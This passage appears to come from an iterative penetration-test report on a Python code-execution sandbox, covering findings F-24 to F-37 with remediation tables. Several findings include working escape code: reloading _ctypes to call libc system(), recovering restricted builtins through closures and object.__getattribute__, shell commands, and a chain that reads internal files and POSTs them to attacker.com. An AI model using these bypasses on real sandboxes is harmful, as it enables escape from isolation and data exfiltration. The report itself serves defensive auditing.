| `loadavg` | `0.03 0.07 0.02` |
| `processes total` | 10,502,902 |

All read-only. Not directly exploitable.

### FINDING-24: Audit Hooks as DoS Weapon (Low)

**Issue:** `sys.addaudithook()` installs permanent, irremovable hooks. 100+ hooks installed without limit. Could interfere with billing/output within a single execution.

### FINDING-25: _ctypes C Extension Recoverable from Disk — Full ctypes Bypass (Critical)

**Issue:** The `_harden_sandbox()` function poisons `ctypes` and `_ctypes` in `sys.modules` with fake modules. However, the `_ctypes` C extension shared object file remains on disk at `/usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so`. User code can reload it using `importlib.util.spec_from_file_location()`, then use `dict.__setitem__()` (F-20 bypass) to inject it back into `sys.modules`. The recovered `_ctypes` provides `dlopen()`, `dlsym()`, `call_cdeclfunction()`, and `CFuncPtr` — enough to call any C function in libc.

**Evidence (Round 7):**
```python
import importlib.util, sys

# Load real _ctypes from .so file on disk
so = '/usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so'
spec = importlib.util.spec_from_file_location('_ctypes', so)
_ct = importlib.util.module_from_spec(spec)
dict.__setitem__(sys.modules, '_ctypes', _ct)
spec.loader.exec_module(_ct)

# Open libc and get system() address
lh = _ct.dlopen('libc.so.6', 2)
sa = _ct.dlsym(lh, 'system')

# Call system() via low-level C function call
_ct.call_cdeclfunction(sa, (b'id > /tmp/out 2>&1',))
# Output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

# Also works with CFuncPtr:
class SysFunc(_ct.CFuncPtr):
    _flags_ = _ct.FUNCFLAG_CDECL
    _restype_ = None
SysFunc(sa)(b'whoami > /tmp/out 2>&1')  # Output: nobody
```

**Impact:**
- **Completely defeats ctypes poisoning** — the primary defense-in-depth measure from R6
- **Shell access restored** — `libc.system()` executes arbitrary commands
- **All Python-level restrictions bypassed** — subprocess, os.system, os.popen blocks irrelevant
- **Data exfiltration confirmed** — `curl` works via `system()` to external HTTPS servers

**Recommendation:**
1. **Delete the `_ctypes` .so file from the sandbox filesystem overlay** — this is the only reliable fix
2. Also delete `_ctypes_test.cpython-311-x86_64-linux-gnu.so`
3. Consider deleting all `.so` files that are not needed for allowed packages

### FINDING-26: `__slots__` Bypass via Direct Attribute Access (High)

**Issue:** The `_harden_sandbox()` function uses `__slots__` on `_RestrictedGetframe`, `_RestrictedOpen`, `_RestrictedOsOpen`, `_RestrictedIoOpen`, and `_RestrictedSignal` classes to prevent `__dict__` access. However, `__slots__` attributes are directly accessible via `obj._f` or `object.__getattribute__(obj, '_f')`. The original unrestricted functions stored in `_f` are trivially recoverable.

**Evidence (Round 7):**
```python
# sys._getframe bypass — recover real _getframe
real_getframe = sys._getframe._f   # direct attribute access works
parent = real_getframe(1)           # → execute.py run() frame with ALL locals

# builtins.open bypass — recover real open
real_open = builtins.open._f       # direct attribute access works
with real_open('/proc/net/tcp') as f:
    data = f.read()                # → 16 lines of TCP connection data (BYPASSED)

# os.open bypass — recover real os.open
real_os_open = os.open._f          # direct attribute access works

# signal.signal bypass — recover real signal handler
real_signal = signal.signal._f     # direct attribute access works
real_signal(signal.SIGTERM, lambda s, f: None)  # SIGTERM handler overridden
```

**Impact:**
- **All `_harden_sandbox()` restrictions bypassed** without needing ctypes
- **Stack frame traversal restored** (F-17) — full access to execute.py internals
- **/proc/net leakage restored** (F-08) — full TCP connection table, ARP table readable
- **Signal handler override restored** (F-19)
- The `__closure__` bypass from R6 was fixed, but the replacement (`__slots__` + `_f` attribute) is equally accessible

**Recommendation:**
1. Store the real function reference in a module-level variable that is `del`'d after use, not as an instance attribute
2. Or use a C extension / `ctypes.pythonapi` (ironic, given F-25) to create truly opaque wrappers
3. Best approach: don't store real references at all — use a dispatch pattern where the real function is called from a scope that user code cannot reach

### FINDING-27: _getframe Restriction Breaks stdlib Modules — Functional Regression (Medium)

**Issue:** The `_RestrictedGetframe` blocks `sys._getframe(depth > 0)`. However, `collections.namedtuple()` calls `sys._getframe(1)` internally to determine the caller's module name. This breaks any module that uses `namedtuple` during import, including critical stdlib and site-packages modules.

**Evidence (Round 7):**
```
Broken stdlib modules: socket, urllib.request, http.client, ssl, pathlib,
    tempfile, shutil, typing, dataclasses, selectors, asyncio

Working stdlib modules: json, os, sys, io, hashlib, base64, math, time,
    struct, csv, collections, threading, logging, email

Broken site-packages: All networking (httpx, requests fail at import time
    in the main sandbox process)
```

The breakage occurs because these modules call `collections.namedtuple()` during import, which internally calls `sys._getframe(1)` at `/usr/local/lib/python3.11/collections/__init__.py:512`.

**Impact:**
- **User code cannot use socket, urllib, httpx, requests, pathlib, asyncio** — major functionality regression
- Ironically, **subprocess python3** processes work fine (they don't inherit the Python-level `_getframe` restriction), so networking works via `libc.system()` + subprocess
- The restriction hurts legitimate users more than attackers

**Recommendation:**
1. Allow `_getframe(1)` when called from within stdlib (check `f_code.co_filename` starts with `/usr/local/lib/python3.11/`)
2. Or block only depths > 1 (allows namedtuple's single-frame lookup)
3. Or pre-import all necessary modules before installing the restriction

### FINDING-28: object.__getattribute__ Bypasses All __getattribute__ Overrides (Critical)

**Issue:** Round 8 hardening added `__getattribute__` overrides to all `_Restricted*` classes, blocking direct `._f` access (fixing F-26). However, `object.__getattribute__(instance, '_f')` bypasses any class-level `__getattribute__` override because it goes through the C-level descriptor protocol directly, reading the `__slots__` descriptor from the class's `__dict__`.

**Evidence (Round 8):**
```python
# All _Restricted* classes have __getattribute__ that blocks '_f':
sys._getframe._f           # → AttributeError: Access denied  (blocked)
builtins.open._f           # → AttributeError: Access denied  (blocked)

# But object.__getattribute__ bypasses the override:
real_gf = object.__getattribute__(sys._getframe, '_f')    # → <built-in function _getframe>
real_open = object.__getattribute__(builtins.open, '_f')   # → <built-in function open>
real_os_open = object.__getattribute__(os.open, '_f')      # → <built-in function open>
real_signal = object.__getattribute__(signal.signal, '_f') # → <function signal>

# Slot descriptors also work:
type(sys._getframe).__dict__['_f'].__get__(sys._getframe)  # → same result
```

**Impact:** Every `_Restricted*` class in `_harden_sandbox()` is fully bypassed. This recovers:
- `sys._getframe` → full stack frame traversal into execute.py (F-17)
- `builtins.open` → read /proc/net/tcp, /proc/net/arp, /proc/self/mountinfo (F-08)
- `os.open` → same via low-level I/O
- `signal.signal` → override SIGTERM handler (F-19)
- `importlib.util.spec_from_file_location` → bypass _ctypes import restriction

**Recommendation:** This bypass is **fundamental to Python's object model** — `object.__getattribute__` cannot be overridden at the instance level because it IS the base mechanism. Mitigation options:
1. **Don't store real references at all** — restructure to not keep `_f` references in user-accessible objects
2. Use C-level opaque wrappers (requires a custom C extension)
3. Accept that Python-level attribute hiding is impossible and rely solely on nsjail+seccomp

### FINDING-29: posix.system — Unblocked os.system Alias (Critical)

**Issue:** `_harden_sandbox()` replaces `os.system` with a `_blocked` function. However, the `posix` module (which `os` wraps) is importable and its `system()` function is NOT blocked. `posix.system()` is the same C function as `os.system()`.

**Evidence (Round 8):**
```python
import posix
posix.system('id > /tmp/out 2>&1')
# → uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

posix.system('curl -s https://httpbin.org/ip > /tmp/out 2>&1')
# → {"origin": "159.203.30.199"}
```

Also available: `posix.execv`, `posix.fork`, `posix.popen`.

**Impact:** **Immediate shell access in one line of code.** No bypass chain needed — just `import posix; posix.system('command')`. This completely negates the `os.system` blocking in `_harden_sandbox()`.

**Recommendation:**
1. Block `posix.system`, `posix.popen`, `posix.execv`, `posix.execve`, etc. the same way `os.*` are blocked
2. Also check for `_posixsubprocess` (see F-30)
3. Consider using `sys.modules` poisoning for the `posix` module

### FINDING-30: Real subprocess Recoverable via __import__ Closure + dict.__delitem__ (Critical)

**Issue:** The `_guarded_import` function stores the real `__import__` in its closure (cell index 1). User code can extract it via `__import__.__closure__[1].cell_contents`. Combined with `dict.__delitem__(sys.modules, 'subprocess')` to remove the fake stub, the real `subprocess` module loads from disk with full `Popen`, `run`, etc.

The real `subprocess` uses `_posixsubprocess.fork_exec` (C extension) which performs fork+exec at the C level, bypassing both the Python-level `os.fork` block and the seccomp `fork()` filter (it uses `clone()` or `vfork()` internally).

**Evidence (Round 8):**
```python
real_import = __import__.__closure__[1].cell_contents
dict.__delitem__(sys.modules, 'subprocess')
subprocess = real_import('subprocess')

# Full subprocess access:
subprocess.run(['id'], capture_output=True, text=True)
# → uid=65534(nobody)

subprocess.run(['curl', '-s', 'https://httpbin.org/ip'], capture_output=True, text=True)
# → {"origin": "159.203.30.199"}

subprocess.run(['/bin/sh', '-c', 'echo SHELL'], capture_output=True, text=True)
# → SHELL
```

**Impact:** Full shell access, data exfiltration, reverse shell — all without ctypes.

**Recommendation:**
1. Don't store `_real_import` in a closure — use a pattern that cannot be introspected
2. Block `_posixsubprocess` loading (add to poisoned modules)
3. Block `posix` module `system`/`exec*`/`spawn*` functions

### FINDING-31: gc.get_objects() Recovers Real Built-in Functions (Medium)

**Issue:** `gc.get_objects()` scans the interpreter's garbage collector and finds all Python objects, including the real `open` built-in function that `_harden_sandbox()` wrapped. User code can iterate the GC to find and use the unwrapped function.

**Evidence (Round 8):**
```python
import gc
for obj in gc.get_objects():
    if type(obj).__name__ == 'builtin_function_or_method' and getattr(obj, '__name__', '') == 'open':
        with obj('/proc/net/tcp') as f:
            data = f.read()  # → 18 lines (BYPASSED)
            break
```

**Impact:** Alternative bypass for file access restrictions. Lower severity since F-28 and F-29 provide easier paths.

**Recommendation:** Consider `gc.disable()` and clearing `gc.get_objects` — though this has side effects on memory management.

### FINDING-32: _posixsubprocess.fork_exec Recoverable from Disk — But execve Blocked (Medium)

**Issue:** The `_posixsubprocess` .so file (27 KB) is NOT hollowed like `_ctypes`. User code can reload it from disk using `object.__getattribute__(importlib.util.spec_from_file_location, '_f')` to recover the real `spec_from_file_location`, then load the real `_posixsubprocess` C extension with `fork_exec` as a `builtin_function_or_method`.

The `fork()` succeeds (returns pid=2), but `execve()` is now blocked at the seccomp/kernel level — every binary (including `/bin/sh` and `/usr/local/bin/python3`) fails with `OSError:9:noexec`.

**Evidence (Round 9):**
```python
real_spec_fn = object.__getattribute__(importlib.util.spec_from_file_location, '_f')
spec = real_spec_fn('_posixsubprocess', '/usr/local/lib/python3.11/lib-dynload/_posixsubprocess.cpython-311-x86_64-linux-gnu.so')
fresh = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fresh)

# fresh.fork_exec is builtin_function_or_method (REAL C function)
# fork succeeds (pid=2) but exec fails: "OSError:9:noexec"
```

**Impact:** Low — `fork()` works but `execve()` is blocked. The child process exits immediately with status 255. No shell access is possible via this path. The `_posixsubprocess` .so should still be hollowed for defense-in-depth.

**Recommendation:** Bind-mount `.empty` over `_posixsubprocess.cpython-311-x86_64-linux-gnu.so` the same way `_ctypes` was handled.

### FINDING-33: Data Exfiltration Chain Without Shell — F-28 + F-16 (Critical)

**Issue:** Shell access is no longer required for data exfiltration. The combination of `object.__getattribute__` bypass (F-28) and unrestricted outbound HTTP (F-16) allows reading sensitive files and exfiltrating them via `urllib.request` — all in pure Python, no subprocess needed.

**Evidence (Round 9):**
```python
import builtins, urllib.request, json

# F-28: Recover real open
real_open = object.__getattribute__(builtins.open, '_f')

# Read sensitive data
with real_open('/proc/net/tcp') as f: tcp = f.read()
with real_open('/proc/net/arp') as f: arp = f.read()
with real_open('/opt/mcpworks/bin/execute.py') as f: source = f.read()

# F-16: Exfiltrate via HTTP POST
payload = json.dumps({"tcp": tcp, "arp": arp, "source": source}).encode()
req = urllib.request.Request('https://attacker.com/collect', data=payload,
    headers={'Content-Type': 'application/json'})
urllib.request.urlopen(req)  # → 200 OK, data received by attacker
```

**Confirmed exfiltrated in test:**
- `/proc/net/tcp` — 22 lines (full TCP connection table)
- `/proc/net/arp` — 4 Docker container IPs and MAC addresses
- `/opt/mcpworks/bin/execute.py` — 23,549 bytes (full sandbox wrapper source)
- Server origin IP confirmed: `159.203.30.199`

**Impact:** Critical — no shell needed. Any sandboxed code can read sensitive files via F-28 and exfiltrate them over HTTPS. This is the **primary remaining attack vector** now that shell access is blocked.

**Recommendation:** Block outbound internet access (F-16). This single change would neutralize this chain entirely.

### FINDING-34: Closure-Based Open Wrappers Trivially Bypassed (Critical)

**Issue:** Round 10 changed `builtins.open`, `os.open`, `io.open`, and `_io.open` from `_Restricted*` class wrappers (with `__slots__`) to closure-based function wrappers. The closure stores the real built-in function as a cell variable (`_real_open`). Python closures are fully introspectable — `func.__closure__[0].cell_contents` recovers the real function in one line.

This is a **security regression** from R9: the previous `_Restricted*` class pattern required `object.__getattribute__` (a more obscure technique), while closures are a basic Python feature.

**Evidence (Round 10):**
```python
import builtins, os, io

# All three wrappers bypassed identically:
real_open    = builtins.open.__closure__[0].cell_contents  # <built-in function open>
real_os_open = os.open.__closure__[0].cell_contents        # <built-in function open>
real_io_open = io.open.__closure__[0].cell_contents        # <built-in function open>

# Read any blocked file:
with real_open('/proc/net/tcp') as f: print(f.read())      # 2550 bytes — BYPASSED
with real_open('/opt/mcpworks/bin/execute.pyc', 'rb') as f: # 30269 bytes — BYPASSED
    data = f.read()
```

**Impact:** Every file access restriction in `_is_blocked_path` is completely bypassed. All previously blocked paths (`/proc/net/*`, `/proc/self/mountinfo`, `/opt/mcpworks/bin/*`, etc.) are readable. Combined with F-16 (outbound internet), this enables full data exfiltration.

**Recommendation:**
1. Do not store real function references in closures — they are always introspectable in CPython
2. Do not store them in `__slots__` either (bypassed via `object.__getattribute__`, F-28)
3. The only effective approach: **don't intercept open() at all** — use filesystem-level controls (bind-mount empty files over sensitive paths, or use `clone_newnet:true` to eliminate `/proc/net/*`)

### FINDING-35: _GuardedImport Regression — Real __import__ Now Recoverable (High)

**Issue:** In R9, `_GuardedImport` was a class with no `_f` attribute accessible to user code — `object.__getattribute__` could not recover the real `__import__`. In R10, `_GuardedImport` now has `__slots__ = ('_f',)`, storing the real `__import__` built-in. This is recoverable via `object.__getattribute__`.

**Evidence (Round 10):**
```python
import builtins
gi = builtins.__import__
real_import = object.__getattribute__(gi, '_f')
# → <built-in function __import__>
```

**Impact:** The real `__import__` can import any module, bypassing the `_POISONED_MODULES` check. Combined with `dict.__delitem__(sys.modules, 'module_name')`, this could potentially reload poisoned modules from disk.

**Recommendation:** Do not store real `__import__` as an instance attribute. Use a module-scoped variable that is deleted after the wrapper is installed.

### FINDING-36: execute.pyc Fully Decompilable via marshal (Medium)

**Issue:** Round 10 replaced `execute.py` (source) with `execute.pyc` (compiled bytecode). However, Python `.pyc` files contain marshalled code objects that can be loaded with `marshal.loads()` and fully introspected — all string constants, function names, variable names, nested code objects, and bytecode are recoverable. This provides the same intelligence value as the source code.

**Evidence (Round 10):**
```python
import marshal, types, builtins

real_open = builtins.open.__closure__[0].cell_contents
with real_open('/opt/mcpworks/bin/execute.pyc', 'rb') as f:
    pyc = f.read()  # 30,269 bytes

code_obj = marshal.loads(pyc[16:])  # Skip .pyc header

# All function names recovered:
# _is_blocked_path, _harden_sandbox, run, _read_call_log, _truncate, _write_output
# All 37 nested functions in _harden_sandbox recovered
# All string constants recovered (121 strings)
# Blocked path list recovered: /proc/net/, /proc/self/mountinfo, /opt/mcpworks/bin/, etc.
# Variable names: _real_getframe, _real_signal, _real_open, _real_os_open, etc.
```

**Impact:** Removing source code provides no security benefit — `.pyc` contains equivalent information. An attacker can reconstruct the full `_harden_sandbox()` logic, blocked path list, poisoned module list, and all internal function names.

**Recommendation:** This is informational — `.pyc` decompilation cannot be prevented while the file must be importable. Focus on filesystem-level protections instead.

### FINDING-37: `__call__` Method Closure Bypass — Real Functions Recovered (Critical)

**Issue:** Round 11 restructured all `_Restricted*` classes to use empty `__slots__ = ()` (no `_f` attribute) and moved the real function reference into the `__call__` method's closure. This blocks `object.__getattribute__(instance, '_f')` (F-28) and direct closure access on the instance (F-34). However, the `__call__` method is a regular Python function accessible via `type(instance).__dict__['__call__']`, and its closure cells are fully introspectable.

**Evidence (Round 11):**
```python
import builtins, sys, signal

# builtins.open — real open in __call__ closure
real_open = type(builtins.open).__dict__['__call__'].__closure__[0].cell_contents
# → <built-in function open>

# sys._getframe — stdlib prefixes + real _getframe in __call__ closure
gf_call = type(sys._getframe).__dict__['__call__']
stdlib_prefixes = gf_call.__closure__[0].cell_contents
# → ('/usr/local/lib/', '/usr/lib/', '/opt/mcpworks/site-packages/')
real_getframe = gf_call.__closure__[1].cell_contents
# → <built-in function _getframe>

# signal.signal — allowed signals + real signal in __call__ closure
sig_call = type(signal.signal).__dict__['__call__']
allowed_signals = sig_call.__closure__[0].cell_contents
# → frozenset({SIGINT, SIGPIPE})
real_signal = sig_call.__closure__[1].cell_contents
# → <function signal>

# __import__ — poisoned modules + real __import__ in __call__ closure
gi_call = type(builtins.__import__).__dict__['__call__']
poisoned = gi_call.__closure__[0].cell_contents
# → frozenset({'ctypes', '_ctypes', '_posixsubprocess', ...})
real_import = gi_call.__closure__[1].cell_contents
# → <built-in function __import__>

# Read any blocked file:
with real_open('/proc/net/tcp') as f: data = f.read()  # 2400 bytes — BYPASSED
with real_open('/proc/self/mountinfo') as f: data = f.read()  # 26407 bytes — BYPASSED
```

**Impact:** All file access restrictions, frame access restrictions, signal restrictions, and import guards are completely bypassed. Combined with F-16 (outbound internet), the full data exfiltration chain remains operational. Additionally, the closure leak now reveals **configuration data** (stdlib prefixes, allowed signals, poisoned module list) that was previously opaque.

**Additional R11 changes with no security benefit:**
- Wrapper script moved from `/opt/mcpworks/bin/execute.py` → `/sandbox/.e` (self-deleting after load) — code objects remain in memory, fully introspectable via `__globals__`
- `/opt/mcpworks/bin/` directory removed — but code is recoverable from living function objects
- Class names shortened (`_R`, `_G`) — cosmetic obfuscation

**Recommendation:** This is the **third iteration** of the same fundamental problem (F-28 → F-34 → F-37): CPython provides no way to hide function references from introspection. The only viable mitigations are:
1. **Don't intercept Python builtins at all** — use OS-level controls (mount namespaces, bind-mounts, seccomp)
2. **C extension wrapper** — a custom `.so` that holds the real function pointer in C memory (not a Python object)
3. **Out-of-process architecture** — run user code in a subprocess where the parent never shares its function references

---

## Security Testing — Negative Results (Rounds 4–9)

The following attacks were tested and **did not succeed**, indicating proper defenses:

| Attack | Result |
|--------|--------|
| JWT `alg=none` bypass | Rejected ("alg value is not allowed") |
| JWT algorithm confusion (HS256, RS256, etc.) | All rejected except ES256 |
| SQL injection in namespace/service names | Rejected (Pydantic validation) |
| Command injection in namespace names | Rejected (regex validation `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`) |
| SSTI (Jinja2/Python templates) in descriptions | Stored as-is, not evaluated |
| Path traversal in API paths | 404 (proper routing) |
| HTTP request smuggling (CL.TE, TE.CL) | Caddy properly rejected (returned 405) |
| IDOR / cross-namespace access | 403 ("Access denied to this namespace") |
| Admin endpoints with user token | 403 ("Admin access required") |
| Duplicate email registration | 409 ("Email already registered") |
| Username enumeration via login | Uniform error messages |
| Raw socket / packet sniffing | Blocked (no capability) |
| /proc/self/mem write | Blocked (read-only filesystem) |
| Email overflow / long input | Rejected (Pydantic validation) |
| Prototype pollution via JSON | Extra fields ignored by Pydantic |
| Cross-sandbox file access | Not possible (isolated tmpfs per execution) |
| Cross-sandbox /tmp access | `/tmp/mcpworks-sandbox/` not accessible (mount namespace) |
| Core dump exploitation | RLIMIT_CORE=0/0, cannot be raised |
| /proc/sys kernel param writes | All read-only from sandbox |
| sysrq-trigger | Read-only filesystem |
| Port binding (bind syscall) | **SIGSYS** R5 → **ALLOWED** R7 (listen blocked instead) |
| Port listening (listen syscall) | **SIGSYS** — process killed (R7, replaced bind block) |
| mmap(PROT_EXEC) via ctypes | **SIGSEGV** — process killed (seccomp blocks executable memory) |
| `ls` via ctypes.system() | **SIGSYS** — `ls` uses seccomp-blocked syscall (but `cat`, `id`, `uname` work) |
| `posix.system('id')` | **Blocked** R9 — returns "Subprocess execution is not permitted in sandbox" |
| `posix.execv`, `posix.execve`, `posix.posix_spawn` | **Blocked** R9 — all replaced with `_blocked` function |
| `ctypes.CDLL('libc.so.6')` | **Blocked** R9 — returns "Subprocess execution is not permitted in sandbox" |
| `_posixsubprocess.fork_exec` (poisoned) | **Blocked** R9 — sys.modules stub |
| `_posixsubprocess.fork_exec` (reloaded from .so) | Fork succeeds, **execve blocked** by seccomp — "OSError:9:noexec" |
| `__import__.__closure__` | **Blocked** R9 — `_GuardedImport` class has no `__closure__` |
| `gc.get_objects()` | **Blocked** R9 — replaced with `_blocked` function |
| `importlib.reload(posix)` to recover `system()` | **Blocked** — reload returns the already-patched module |
| `object.__getattribute__(open, '_f')` | **Blocked R11** — `__slots__ = ()`, no `_f` attribute (but bypassed via F-37) |
| `builtins.open.__closure__` | **Blocked R11** — wrapper is now a class instance, not a function (but `__call__` closure bypassed via F-37) |
| `pty.fork()` / `pty.spawn()` | **SIGSYS** — `fork()` syscall blocked by seccomp |
| Internal service access via curl | Timeout (firewall blocks all internal IPs) |
| localhost:8000 API access from sandbox | Timeout (firewall blocks loopback to API) |
| Cloud metadata endpoints | Timeout (169.254.169.254, 169.254.170.2, 100.100.100.200) |
| /proc/self/mem heap scan | I/O error (ptrace-equivalent access blocked) |
| Docker service DNS resolution | "Name or service not known" for all service names |
| .pth file persistence across executions | Workspace is ephemeral — no cross-execution persistence |
| pip install from sandbox | Binary not in PATH (subprocess fails) |
| ICMP tunneling (raw sockets) | Blocked — no CAP_NET_RAW |
| Internal hostname resolution | All Docker service names unresolvable |
| ctypes env var extraction | No secrets in process environment (only 4 safe vars) |
| gc object scan for secrets | No secret strings found in garbage collector objects |

---

## Remediation Progress

| Finding | R1 | R2 | R3 | R4 | R5 | R6 | R7 | R8 | R9 | R10 | R11 | Change |
|---------|----|----|----|----|-----|-----|-----|-----|-----|------|------|--------|
| Internal service network access | REFUSED | TIMEOUT | — | — | TIMEOUT | — | TIMEOUT | — | — | — | — | Fixed |
| /proc cpuinfo/meminfo/version | Real data | Fake | — | — | — | — | Fake | — | — | — | — | Fixed |
| Cloud metadata (169.254.169.254) | Not tested | Blocked | — | — | Blocked | — | Blocked | — | — | — | — | Fixed |
| Email verification bypass | — | — | Bypass | **Fixed** | — | — | — | — | — | — | — | Fixed R3→R4 |
| Registration rate limiting | — | — | Unlimited | **3/hour** | — | — | 3/hour | — | — | — | — | Fixed R3→R4 |
| Port hijacking (F-02) | — | — | — | BINDABLE | **SIGSYS** | — | listen SIGSYS | — | — | — | — | Fixed R7 |
| Exec token leakage (F-03) | — | — | — | In globals | **Removed** | — | — | — | — | — | — | **Fixed R4→R5** |
| Billing (F-04) | — | — | — | Patchable | Renamed | File-based | — | — | — | — | — | **Fixed R5→R6** |
| Localhost API access | — | — | — | — | TIMEOUT | — | TIMEOUT | — | — | — | — | Fixed |
| Stack frame traversal (F-17) | — | — | — | — | CONFIRMED | Closure | `_f` | obj.__getattr__ | obj.__getattr__ | obj.__getattr__ | **`__call__` closure** | Still bypassed (F-37) |
| Subprocess/shell (F-18) | — | — | — | — | CONFIRMED | ctypes | .so | posix+subprocess | **execve BLOCKED** | — | — | **Fixed R8→R9 (seccomp)** |
| Signal override (F-19) | — | — | — | — | CONFIRMED | Closure | `_f` | obj.__getattr__ | obj.__getattr__ | obj.__getattr__ | **`__call__` closure** | Still bypassed (F-37) |
| sys.modules (F-20) | — | — | — | — | CONFIRMED | dict | dict | dict | dict persists | dict persists | **dict persists** | Never fixed |
| /proc/net block (F-08) | Full | Full | Full | Full | Full | open | `_f` | obj.__getattr__ | obj.__getattr__ | closure bypass | **`__call__` closure** | Still bypassed (F-37) |
| **Admin panel (F-05)** | — | Unauthed | Unauthed | Unauthed | — | — | **404** | — | — | — | — | **Fixed R6→R7** |
| Stored XSS (F-01) | — | — | Confirmed | — | — | — | Untestable | — | Untestable | Untestable | Untestable | Unknown |
| Namespace squatting (F-06) | — | — | Confirmed | — | — | — | Untestable | — | Untestable | Untestable | Untestable | Unknown |
| **CORS (F-07)** | — | — | Confirmed | — | — | — | **Fixed** | — | — | — | — | **Fixed R6→R7** |
| **Login rate limiting (F-10)** | — | — | Missing | Missing | — | — | **429** | — | — | — | — | **Fixed R6→R7** |
| Outbound internet (F-16) | — | — | — | — | CONFIRMED | — | CONFIRMED | CONFIRMED | CONFIRMED | CONFIRMED | **CONFIRMED** | Still open |
| Python sandbox bypass (F-22) | — | — | — | — | — | ALL | .so | — | — | — | — | F-25 fixed R8 |
| Sandbox→API access (F-09) | — | — | Confirmed | — | — | — | **Blocked** | — | — | — | — | **Fixed R6→R7** |
| _getframe regression (F-27) | — | — | — | — | — | — | Broken | **Fixed** | — | — | — | **Fixed R8** |
| obj.__getattr__ bypass (F-28) | — | — | — | — | — | — | — | NEW | CONFIRMED | CONFIRMED | **`_f` blocked, `__call__` bypass** | Evolved → F-37 |
| **posix.system (F-29)** | — | — | — | — | — | — | — | Shell 1-line | **FIXED** | — | — | **Fixed R8→R9** |
| **Real subprocess (F-30)** | — | — | — | — | — | — | — | Full Popen | **FIXED** | — | — | **Fixed R8→R9** |
| **gc.get_objects (F-31)** | — | — | — | — | — | — | — | GC scan | **FIXED** | — | — | **Fixed R8→R9** |
| _posixsubprocess .so (F-32) | — | — | — | — | — | — | — | — | fork OK, exec BLOCKED | — | — | New R9 (seccomp) |
| Data exfil chain (F-33) | — | — | — | — | — | — | — | — | CONFIRMED | CONFIRMED | **CONFIRMED** | Still open |
| Closure open bypass (F-34) | — | — | — | — | — | — | — | — | — | NEW REGRESSION | **Blocked** → F-37 | Fixed R10→R11 |
| __import__ _f regression (F-35) | — | — | — | — | — | — | — | — | — | NEW REGRESSION | **Blocked** → F-37 | Fixed R10→R11 |
| execute.pyc decompile (F-36) | — | — | — | — | — | — | — | — | — | NEW | **.e self-delete** | Mitigated R11 |
| `__call__` closure bypass (F-37) | — | — | — | — | — | — | — | — | — | — | **NEW** | New R11 |

---

## Positive Security Controls

1. **nsjail with seccomp** — strong process isolation; `symlink`, `mknod`, `mount`, `ptrace`, `fork`, `bind` all trigger SIGSYS
2. **All capabilities dropped** — no privilege escalation via capability abuse
3. **NoNewPrivs enforced** — prevents setuid/setgid escalation
4. **Read-only root filesystem** — only `/sandbox` and `/tmp` are writable
5. **User namespace isolation** — runs as `nobody` (65534) with no mapping to privileged UIDs
6. **Token handling** — file-based, read-once-delete pattern avoids env var leakage
7. **Resource limits** — per-sandbox and aggregate cgroup limits prevent DoS
8. **Output size caps** — 64 KB stdout/stderr, 1 MB JSON prevents output bombs
9. **Tier-based resource scaling** — free tier gets minimal resources
10. **Tmpfs workspaces** — per-execution tmpfs, cleaned up after execution
11. **Firewall rules** — internal Docker services blocked from sandbox (added after Round 1)
12. **Cloud metadata blocked** — `169.254.169.254` not reachable from sandbox
13. **Fake /proc entries** — cpuinfo/meminfo/version sanitized (added after Round 1)
14. **Security headers** — `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`
15. **API authentication** — Bearer token (ES256 JWT) required for all `/v1/` data endpoints
16. **JWT algorithm allowlist** — only ES256 accepted; `none`/HS256/RS256 all rejected
17. **Docs disabled** — `/docs` and `/openapi.json` return 404 in production
18. **IDOR protection** — cross-namespace access properly returns 403
19. **Uniform login errors** — no username enumeration ("Invalid email or password")
20. **Duplicate email prevention** — registration returns 409 for existing emails
21. **Input validation** — Pydantic validation rejects bad emails, SQL injection, prototype pollution
22. **Namespace name validation** — regex enforced `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`
23. **Namespace deletion soft-delete** — 30-day recovery window
24. **Registration rate limiting** — 3 per hour per IP (added after Round 3)
25. **Email verification enforced** — write operations require verification (fixed after Round 3)
26. **PIN verification rate limiting** — 20 per minute on `/v1/auth/verify-email`
27. **HTTP smuggling resistance** — Caddy properly rejects ambiguous CL/TE requests
28. **Port listening blocked** — `listen()` syscall now triggers SIGSYS; `bind()` allowed for outbound use (policy refined R7)
29. **Exec token removed from globals** — no longer accessible to user code (fixed after Round 4)
30. **Ephemeral workspace** — each execution gets fresh tmpfs; no cross-execution file persistence
31. **Executable memory blocked** — `mmap(PROT_EXEC)` triggers SIGSEGV via seccomp
32. **Comprehensive internal firewall** — localhost:8000, all Docker IPs, metadata endpoints, and self-IP blocked
33. **Clean process environment** — only 4 safe env vars; no secrets discoverable via ctypes or /proc/self/environ
34. **Admin panel removed** — `/admin` returns 404 (fixed R6→R7)
35. **CORS origin validation** — evil origins get HTTP 400; only `mcpworks.io` allowed with credentials (fixed R6→R7)
36. **Login rate limiting** — 429 after ~4 failed attempts per IP (fixed R6→R7)
37. **Sandbox→API egress blocked** — sandbox cannot reach mcpworks.io API endpoints (self-IP firewall, fixed R6→R7)
38. **ctypes module poisoned + .so hollowed** — `ctypes`/`_ctypes` stubs in sys.modules; .so bind-mounted to 0 bytes; importlib restricted (fixed R8)
39. **Python-level sandbox hardening** — `_harden_sandbox()` restricts _getframe, signal, subprocess, open, os.open, io.open (defense-in-depth, bypassed via F-28/F-34)
40. **_getframe stdlib allowlist** — allows `_getframe(depth>0)` from `/usr/local/lib/` paths, fixing namedtuple/socket breakage (fixed R8)
41. **posix module hardened** — `posix.system/execv/execve/fork/forkpty/popen/posix_spawn/posix_spawnp` all blocked (fixed R9)
42. **`__import__` wrapped in `_GuardedImport` class** — no `__closure__` to extract real import (fixed R9)
43. **`_posixsubprocess` poisoned in sys.modules** — `fork_exec` replaced with `_blocked` (fixed R9)
44. **`gc.get_objects` blocked** — `gc.get_objects/get_referrers/get_referents` replaced with `_blocked` (fixed R9)
45. **`execve` blocked by seccomp** — no binary execution possible; `_posixsubprocess.fork_exec` forks but exec returns `OSError:9:noexec` (fixed R9)
46. **`ctypes.CDLL` blocked** — returns "Subprocess execution is not permitted" (fixed R9)

---

## Summary

### Priority Remediation

